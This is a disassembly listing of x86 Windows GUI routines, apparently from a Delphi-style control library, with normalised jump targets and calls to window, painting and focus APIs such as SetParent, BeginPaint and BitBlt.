mov eax [ eax + 0x180 ]
test eax eax
jne r-xdata
sub_44452c
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_443dbc
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_4444e4
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_443d80
call sub_43fef8
inc edi
dec esi
jne r-xdata
sub_4445c8
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_4445e4
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x19c ]
call sub_41a19c
call sub_4445e4
inc edi
dec esi
jne r-xdata
sub_444644
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov si 0xffb5
call sub_403418
mov ebx eax
mov eax edi
call sub_4445e4
mov eax edi
call sub_444780
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov eax [ edi + 0x180 ]
push eax
call SetFocus
sub_444684
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a6 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x1a6 ] dl
xor eax eax
push ebp
push sub_44475a
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_441a58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_41a19c
call sub_444684
inc esi
dec ebx
jne r-xdata
sub_444780
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_444684
cmp [ ebx + 0x190 ] 0x0
je r-xdata
sub_4447c0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x190 ]
je r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax ebx
call sub_4445e4
mov [ ebx + 0x190 ] esi
cmp [ ebx + 0x190 ] 0x0
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x190 ] esi
push esi
mov eax [ ebx + 0x180 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax ebx
call sub_444780
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov dx 0x3
mov ax 0x3
call sub_406d00
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_441a58
jmp r-xdata
sub_444848
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4448a0
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_44488f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444896
call sub_43f2cc
call sub_42732c
retn
sub_4448c0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_418d40
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
test [ ebx + 0x51 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_406ce8
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_441a58
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_444978
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x19c ]
call sub_41a19c
call sub_4448c0
pop ecx
test al al
jne r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x198 ]
call sub_41a19c
call sub_4448c0
pop ecx
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_444a0c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_4470c4
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406cd4
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_444978
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406ce8
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_441a58
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_444aa0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax ebx
call sub_441014
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx esi
mov eax ebx
call sub_441b24
cmp [ esi + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax ebx
call sub_444a0c
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406cd4
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_4403e8
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_444978
test eax eax
je r-xdata
mov eax ebx
call sub_4576d8
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
call sub_441b24
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
test [ ebx + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax ebx
call sub_4473c8
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_4470c4
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_4470c4
push eax
call DefWindowProcA
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_441a58
sub_444c04
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_441cb8
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_441a58
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_4229f8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_42367c
call sub_4229f8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_4236b8
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_440444
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x180 ]
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_444d0c
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_43d784
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_441a58
mov [ esi + 0xc ] eax
mov bl 0x1
sub_444d40
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
xor edx edx
push ebp
push sub_444e60
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call BeginPaint
mov ebx eax
push ebx
call SaveDC
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc edi
xor esi esi
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_444e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444e67
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push ebx
call RestoreDC
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call EndPaint
inc esi
dec edi
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov eax [ eax + 0x40 ]
push eax
push ebx
call ExcludeClipRect
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_41a19c
cmp [ eax + 0x57 ] 0x0
jne r-xdata
sub_444e98
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx ecx
mov ebp edx
mov esi eax
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
mov eax [ esi + 0x19c ]
test eax eax
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x198 ]
mov eax [ eax + 0x8 ]
mov [ esp ] eax
cmp edi [ esp ]
jge r-xdata
mov edx ebx
call sub_41a1f8
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x17c ]
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ esp + 0xc ] eax
xor edi edi
mov eax [ esi + 0x198 ]
mov edx edi
call sub_41a19c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor edi edi
inc edi
dec [ esp + 0xc ]
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_418d68
lea eax [ esp + 0x10 ]
push eax
push ebp
call RectVisible
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ esi + 0x19c ]
mov edx edi
call sub_41a19c
mov ebx eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc edi
cmp edi [ esp ]
jl r-xdata
test [ esi + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_4229f8
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_418d68
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
mov eax 0xff000014
call sub_4229f8
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_418d68
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
push ebp
call SaveDC
mov [ esp + 0x4 ] eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebp
call sub_43f1e0
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push ebp
call IntersectClipRect
push 0x0
mov ecx ebp
mov edx 0xf
mov eax ebx
call sub_441a58
mov eax [ esp + 0x4 ]
push eax
push ebp
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
or [ ebx + 0x54 ] 0x80
test [ ebx + 0x51 ] 0x4
jne r-xdata
sub_4450c8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x80
push esi
call SaveDC
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_43f1e0
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0xffffffec
mov eax ebx
call sub_4470c4
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_4470c4
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov edi 0x200f
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
mov edi 0xa00f
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_441a58
push 0x0
mov ecx esi
mov edx 0xf
mov eax ebx
call sub_441a58
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call SetRect
push edi
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
call DrawEdge
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_43f1e0
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
mov eax [ ebp - 0xc ]
push eax
push esi
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx esi
call sub_4450c8
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call sub_41a19c
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_44521c
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_444d40
jmp r-xdata
mov eax ebx
call sub_443dbc
test eax eax
jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44536e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_4470c4
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_441a58
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_44521c
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_4470c4
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_44537c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_444d0c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44539c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_444d0c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_445410
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_444d0c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_445430
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_444d0c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_445450
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_444d0c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_445474
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_444d0c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_445498
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_444d0c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4454bc
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_444d0c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4454e0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_432154
mov edi eax
mov eax edi
call sub_432234
test al al
je r-xdata
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_4236b8
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4470c4
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_432334
jmp r-xdata
sub_445568
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1a5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
mov al [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_44238c
test bl bl
je r-xdata
mov eax edi
call sub_4473d4
mov eax edi
call sub_446fcc
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_446fcc
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_445628
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
